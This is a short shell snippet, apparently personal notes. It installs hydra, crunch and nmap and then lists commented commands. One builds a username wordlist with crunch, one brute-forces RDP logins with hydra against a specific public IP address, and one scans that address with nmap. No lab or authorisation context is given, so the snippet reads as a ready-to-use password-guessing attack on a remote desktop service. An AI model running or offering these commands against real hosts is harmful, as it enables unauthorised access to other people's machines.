sudo apt install hydra
sudo apt install crunch
sudo apt install nmap

# crunch 4 6 qwertyuiopasdfghjklzxcvbnm -d 1 >> users.txt
# hydra -V -L users.txt -P password.txt 13.81.100.177 -t 4 rdp
# nmap 13.81.100.177